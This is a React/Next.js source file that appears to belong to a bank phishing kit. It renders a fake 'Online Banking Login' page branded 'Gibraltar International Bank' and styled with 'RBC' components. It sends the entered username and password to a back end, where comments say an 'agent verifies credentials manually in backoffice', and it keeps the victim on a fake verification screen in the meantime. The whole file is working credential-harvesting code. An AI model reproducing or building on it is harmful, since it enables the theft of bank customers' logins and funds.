'use client';

/**
 * Credentials Stage Page
 *
 * Customer enters username and password
 * Minimal client-side validation - accept any format
 * Agent verifies credentials manually in backoffice
 */

import { useCallback, useEffect, useState } from 'react';
import { useParams } from 'next/navigation';
import { useSessionStore } from '@shared';
import { WaitingState } from '@/components/verification/WaitingState';
import { SplitLayout } from '@/components/layout/SplitLayout';
import { RBCInput, RBCButton, RBCCheckbox, RBCFooter, ServiceNotices } from '@/components/ui/RBCComponents';
import { RBCWaitingState, VERIFICATION_STEPS } from '@/components/ui/RBCWaitingState';
import { HelpIcon } from '@/components/ui/icons';
import { AlertCircle } from 'lucide-react';

export default function CredentialsPage() {
  const params = useParams();
  const sessionUuid = params.session_uuid as string;

  const { stage, status, loading, error, caseId } = useSessionStore();
  const { agentMessage } = useSessionStore();

  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [fieldError, setFieldError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isHelpOpen, setIsHelpOpen] = useState(false);

  /**
   * Reset form when agent rejects submission
   */
  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      // Clear form fields and show error
      setUsername('');
      setPassword('');
      setFieldError(agentMessage || 'Your submission was rejected. Please try again.');
      setIsSubmitting(false); // Reset loading state
    }
  }, [status, agentMessage]);

  /**
   * Handle form submission
   */
  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      // Validate case ID is available
      if (!caseId) {
        setFieldError('Session information missing. Please refresh and try again.');
        return;
      }

      // Minimal validation - just check required fields
      if (!username.trim()) {
        setFieldError('Please enter your username');
        return;
      }

      if (!password) {
        setFieldError('Please enter your password');
        return;
      }

      setIsSubmitting(true);

      try {
        const response = await fetch('/api/submit-credentials', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            case_id: caseId,
            username: username.trim(),
            password, // No trimming for password
          }),
        });

        if (!response.ok) {
          console.error('Submission error');
          // Generic error message
          setFieldError('Unable to process your credentials. Please try again.');
          return;
        }

        // Success - show waiting state
        useSessionStore.setState({
          status: 'waiting',
          agentMessage: 'Verifying your credentials...',
          formData: {},
        });
        // Don't set isSubmitting to false - keep waiting state until agent responds
      } catch (error) {
        console.error('Submission error:', error);
        setFieldError('Submission failed. Please try again.');
        setIsSubmitting(false);
      }
    },
    [username, password, sessionUuid, caseId]
  );

  const saveClientLabel = (
    <div className="relative flex items-center">
      <span>Save username</span>
    </div>
  );

  return (
    <SplitLayout>
      <div className="w-full flex flex-col flex-1">
        <div className="mb-[40px] pb-[15px] border-b border-border">
          <h1 className="text-[18px] md:text-[20px] text-foreground font-normal m-0">
            Online Banking Login
          </h1>
          <p className="text-[#555] text-[13px] mt-[10px] font-normal leading-snug">
            Enter your credentials to securely access your Gibraltar International Bank accounts.
          </p>
        </div>

        {isSubmitting ? (
          <RBCWaitingState
            message="Verifying your credentials..."
            steps={VERIFICATION_STEPS.credentials}
          />
        ) : (
          <form onSubmit={handleSubmit} className="w-full mb-5 flex flex-col" noValidate>
            <div className="flex flex-col">
              <RBCInput
                id="username"
                name="username"
                type="text"
                label="Username"
                value={username}
                onChange={(e) => {
                  setUsername(e.target.value);
                  if (fieldError) setFieldError('');
                }}
                disabled={isSubmitting || loading}
                autoComplete="username"
                required
                showLockIcon={true}
              />

              <RBCInput
                id="password"
                name="password"
                type="password"
                label="Password"
                value={password}
                onChange={(e) => {
                  setPassword(e.target.value);
                  if (fieldError) setFieldError('');
                }}
                disabled={isSubmitting || loading}
                autoComplete="current-password"
                required
                showLockIcon={true}
              />
            </div>

            <div className="mt-[-15px] mb-[5px]">
              <RBCCheckbox
                id="save-card"
                label={saveClientLabel}
              />
            </div>

            {/* Field-level error */}
            {fieldError && (
              <div className="flex items-center gap-2 text-sm text-destructive mb-4">
                <AlertCircle className="h-4 w-4" />
                <span>{fieldError}</span>
              </div>
            )}

            {/* API-level error */}
            {error && !fieldError && (
              <div className="flex items-start gap-3 p-3 bg-red-50 rounded-md border border-red-200 mb-4">
                <AlertCircle className="h-4 w-4 text-destructive mt-0.5 flex-shrink-0" />
                <p className="text-sm text-destructive">{error}</p>
              </div>
            )}

            <div className="my-[10px]">
              <RBCButton type="submit" disabled={!username.trim() || !password || isSubmitting || loading}>
                {isSubmitting ? 'Processing...' : 'Login'}
              </RBCButton>
            </div>

            <div className="flex items-center gap-[10px] mt-[5px]">
              <a href="#" className="text-accent no-underline text-[13px] transition-colors hover:underline">
                Forgot Username
              </a>
              <span className="text-[#ccc] text-[12px]">|</span>
              <a href="#" className="text-accent no-underline text-[13px] transition-colors hover:underline">
                Forgot Password
              </a>
            </div>
          </form>
        )}
      </div>
    </SplitLayout>
  );
}
